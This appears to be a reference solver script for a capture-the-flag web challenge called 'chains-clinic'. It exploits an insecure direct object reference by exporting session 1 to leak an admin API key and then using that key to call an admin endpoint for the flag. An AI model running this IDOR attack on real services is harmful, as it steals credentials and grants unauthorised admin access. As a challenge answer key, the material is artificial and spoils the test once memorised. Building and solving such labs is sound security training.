#!/usr/bin/env python3
"""Reference solver for chains-clinic.

Session ids are sequential and the admin is session 1. Export session 1 (IDOR)
to leak the admin API key, then perform the admin rotation.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _req(base + "/login", {"user": "guest"}, "POST")  # observe ids are sequential
    key = _req(base + "/export?sid=1")["record"]["api_key"]
    return _req(base + "/admin/rotate", {"key": key}, "POST")["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
